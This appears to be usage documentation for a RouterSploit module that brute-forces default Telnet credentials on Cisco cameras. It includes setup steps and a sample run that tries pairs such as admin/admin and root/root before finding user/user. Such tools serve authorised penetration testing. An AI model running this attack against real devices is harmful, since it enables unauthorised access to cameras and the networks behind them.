## Description

Module performs dictionary attack with default credentials against Cisco Camera Telnet service.
If valid credentials are found, they are displayed to the user.

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use creds/cameras/cisco/telnet_default_creds`
  3. Do: `set target [TargetIP]`
  4. Do: `run`
  5. If valid credentials are found, they are displayed to the user.

## Scenarios

```
rsf > use creds/cameras/cisco/telnet_default_creds
rsf (Cisco Camera Default Telnet Creds) > set target 192.168.1.1
[+] target => 192.168.1.1
rsf (Cisco Camera Default Telnet Creds) > run
[*] Running module...
[*] Target exposes Telnet service
[*] Starting default credentials attack against Telnet service
[*] thread-0 thread is starting...
[-] Telnet Authentication Failed - Username: 'admin' Password: 'admin'
[-] Telnet Authentication Failed - Username: '1234' Password: '1234'
[-] Telnet Authentication Failed - Username: 'root' Password: '12345'
[-] Telnet Authentication Failed - Username: 'root' Password: 'root'
[+] Telnet Authentication Successful - Username: 'user' Password: 'user'
[*] thread-0 thread is terminated.
[*] Elapsed time: 5.389287948608398 seconds
[+] Credentials found!

   Target          Port     Service     Username     Password
   ------          ----     -------     --------     --------
   192.168.1.1     23       telnet      user         user

```
